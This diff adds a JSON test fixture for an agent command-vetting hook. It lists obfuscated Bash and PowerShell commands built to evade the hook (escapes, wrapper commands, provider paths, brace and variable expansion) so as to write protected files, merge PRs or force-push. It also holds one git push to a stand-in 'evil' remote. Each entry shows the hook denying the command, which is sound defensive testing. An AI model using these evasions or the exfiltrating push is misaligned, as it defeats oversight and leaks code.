@@ -1,0 +1,356 @@
+{
+ "P1 bash `s\\rc` escape in target": {
+  "tool": "bash",
+  "command": "echo x > open-brain/s\\rc/x.ts",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: backslash. The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully parse (Bash and",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `open\\-brain` escape in cp dest": {
+  "tool": "bash",
+  "command": "cp a.ts open\\-brain/src/x.ts",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: backslash. The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully parse (Bash and",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1-only-if bash unquoted `open-brain\\src\\x.ts` (bash writes open-brainsrcx.ts in the root)": {
+  "tool": "bash",
+  "command": "echo x > open-brain\\src\\x.ts",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: backslash. The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully parse (Bash and",
+  "shell": {
+   "wroteUnderSrc": [],
+   "otherFilesInRoot": [
+    "open-brainsrcx.ts"
+   ],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `/dev/../<root>/open-brain/src/x.ts`": {
+  "tool": "bash",
+  "command": "echo x > /dev/../c/qa-scratch/qa241-q237-fx/open-brain/src/x.ts",
+  "hook": "deny",
+  "reason": "Planner hook: denied — planner.md, \"Authority\" / state changes go through `ob_state` via Bash write (/dev/../c/qa-scratch/qa241-q237-fx/open-brain/src/x.ts). The hook checks only a command it can fully parse (Bash and PowerShell); anything else is refused as 'not statically parseable'. Inside that g",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `nice -n 5 cp`": {
+  "tool": "bash",
+  "command": "nice -n 5 cp a.ts open-brain/src/x.ts",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: wrapper, shell or code-running command (nice). The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a ",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `env -u FOO cp`": {
+  "tool": "bash",
+  "command": "env -u FOO cp a.ts open-brain/src/x.ts",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: wrapper with options (env -u). The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can f",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `env --chdir=open-brain/src cp ../../a.ts x.ts`": {
+  "tool": "bash",
+  "command": "env --chdir=open-brain/src cp ../../a.ts x.ts",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: wrapper with options (env --chdir=open-brain/src). The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks onl",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `env -C open-brain/src tee x.ts`": {
+  "tool": "bash",
+  "command": "echo x | env -C open-brain/src tee x.ts > /dev/null",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: wrapper with options (env -C). The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can f",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `$((1<<2))` then a write on the next line": {
+  "tool": "bash",
+  "command": "echo $((1<<2))\ncp a.ts open-brain/src/x.ts\n",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: $ (variable, substitution or $'...' string). The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a co",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 PS drive-relative `Set-Content C:open-brain/src/x.ts`": {
+  "tool": "ps",
+  "command": "Set-Content C:open-brain/src/x.ts x",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: drive-relative path (C:name). The PowerShell command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it ",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P3 PS `FileSystem::<root>\\open-brain\\src\\x.ts`": {
+  "tool": "ps",
+  "command": "Set-Content FileSystem::C:\\qa-scratch\\qa241-q237-fx\\open-brain\\src\\x.ts x",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: provider path (::). The PowerShell command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully ",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P3 PS `Microsoft.PowerShell.Core\\FileSystem::...`": {
+  "tool": "ps",
+  "command": "Set-Content -Path Microsoft.PowerShell.Core\\FileSystem::C:/qa-scratch/qa241-q237-fx/open-brain/src/x.ts -Value x",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: provider path (::). The PowerShell command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully ",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P3 PS quoted comma list `-Path 'C:/qa-tmp/y.txt','open-brain/src/x.ts'`": {
+  "tool": "ps",
+  "command": "Set-Content -Path 'C:/qa-tmp/y.txt','open-brain/src/x.ts' -Value x",
+  "hook": "deny",
+  "reason": "Planner hook: denied — planner.md, \"Authority\" / state changes go through `ob_state` via PowerShell write (open-brain/src/x.ts). The hook checks only a command it can fully parse (Bash and PowerShell); anything else is refused as 'not statically parseable'. Inside that grammar it reads redirects and",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P3 PS `-Path ('open-brain/src/x.ts')`": {
+  "tool": "ps",
+  "command": "Set-Content -Path ('open-brain/src/x.ts') -Value x",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: parenthesis (expression or sub-expression). The PowerShell command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P3 PS `powershell -Comman \"Set-Content ...\"`": {
+  "tool": "ps",
+  "command": "powershell -NoProfile -Comman \"Set-Content open-brain/src/x.ts x\"",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: code-running or unknown command (powershell). The PowerShell command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks on",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "LIMIT PS `Export-Csv -Path open-brain/src/x.ts`": {
+  "tool": "ps",
+  "command": "Get-Date | Export-Csv -Path open-brain/src/x.ts",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: unknown cmdlet (Export-Csv). The PowerShell command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it c",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P2 bash `gh pr m\\erge 2`": {
+  "tool": "bash",
+  "command": "gh pr m\\erge 2",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: backslash. The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully parse (Bash and",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2 bash `gh pr \\<newline>merge 2`": {
+  "tool": "bash",
+  "command": "gh pr \\\nmerge 2",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: backslash. The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully parse (Bash and",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2 bash `gh pr $'merge' 2`": {
+  "tool": "bash",
+  "command": "gh pr $'merge' 2",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: $ (variable, substitution or $'...' string). The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a co",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2 bash `gh pr {merge,} 2`": {
+  "tool": "bash",
+  "command": "gh pr {merge,} 2",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: brace ({ } group or brace expansion). The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command i",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2 bash `X=merge; gh pr $X 2`": {
+  "tool": "bash",
+  "command": "X=merge; gh pr $X 2",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: $ (variable, substitution or $'...' string). The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a co",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2 bash `gh $(echo pr) merge 2`": {
+  "tool": "bash",
+  "command": "gh $(echo pr) merge 2",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: $ (variable, substitution or $'...' string). The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a co",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2b bash `git mer\\ge feature`": {
+  "tool": "bash",
+  "command": "git mer\\ge feature",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: backslash. The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully parse (Bash and",
+  "shell": {
+   "argv": "[\"git\",\"merge\",\"feature\"]",
+   "stderr": ""
+  }
+ },
+ "P2b bash `git {merge,} feature`": {
+  "tool": "bash",
+  "command": "git {merge,} feature",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: brace ({ } group or brace expansion). The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command i",
+  "shell": {
+   "argv": "[\"git\",\"merge\",\"feature\"]",
+   "stderr": ""
+  }
+ },
+ "P2b bash `git \\<newline>merge feature`": {
+  "tool": "bash",
+  "command": "git \\\nmerge feature",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: backslash. The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully parse (Bash and",
+  "shell": {
+   "argv": "[\"git\",\"merge\",\"feature\"]",
+   "stderr": ""
+  }
+ },
+ "P2b bash `git pu\\sh --force origin master`": {
+  "tool": "bash",
+  "command": "git pu\\sh --force origin master",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: backslash. The Bash command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write long text to a file). The hook checks only a command it can fully parse (Bash and",
+  "shell": {
+   "argv": "[\"git\",\"push\",\"--force\",\"origin\",\"master\"]",
+   "stderr": ""
+  }
+ },
+ "P2b PS `git push origin loop/x,master`": {
+  "tool": "ps",
+  "command": "git push origin loop/x,master",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: comma list as an argument to a native command (git); PowerShell passes it as an array. The PowerShell command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write",
+  "shell": {
+   "argv": "[\"git\",\"push\",\"origin\",\"loop/x,master\"]",
+   "stderr": ""
+  }
+ },
+ "P2b PS `git push origin loop/x,--force`": {
+  "tool": "ps",
+  "command": "git push origin loop/x,--force",
+  "hook": "deny",
+  "reason": "Planner hook: denied — not statically parseable: comma list as an argument to a native command (git); PowerShell passes it as an array. The PowerShell command is outside the grammar the hook can check, so it is refused rather than guessed at; rewrite it in plain words (split compound commands, write",
+  "shell": {
+   "argv": "[\"git\",\"push\",\"origin\",\"loop/x,--force\"]",
+   "stderr": ""
+  }
+ },
+ "P2b bash `git -c remote.origin.url=https://github.com/evil/x push origin loop/x`": {
+  "tool": "bash",
+  "command": "git -c remote.origin.url=https://github.com/evil/x push origin loop/x",
+  "hook": "deny",
+  "reason": "Planner hook: denied — shared.md, \"Each outward-facing act needs authority for THAT act\" (D-038 / D-032). Command: git -c remote.origin.url=https://github.com/evil/x push origin loop/x",
+  "shell": {
+   "argv": "[\"git\",\"-c\",\"remote.origin.url=https://github.com/evil/x\",\"push\",\"origin\",\"loop/x\"]",
+   "stderr": ""
+  }
+ }
+}
